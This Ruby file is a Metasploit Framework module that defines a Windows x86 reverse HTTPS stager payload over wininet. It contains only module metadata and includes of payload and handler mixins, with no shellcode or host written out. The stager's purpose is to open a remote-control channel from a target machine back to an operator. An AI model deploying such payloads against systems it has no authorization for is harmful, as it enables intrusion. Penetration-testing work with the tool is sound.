##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_https'
require 'msf/core/payload/windows/reverse_https'

module Metasploit4

  CachedSize = 347

  include Msf::Payload::Stager
  include Msf::Payload::Windows
  include Msf::Payload::Windows::ReverseHttps

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Windows Reverse HTTPS Stager (wininet)',
      'Description' => 'Tunnel communication over HTTPS (Windows wininet)',
      'Author'      => 'hdm',
      'License'     => MSF_LICENSE,
      'Platform'    => 'win',
      'Arch'        => ARCH_X86,
      'Handler'     => Msf::Handler::ReverseHttps,
      'Convention'  => 'sockedi https'))
  end

end
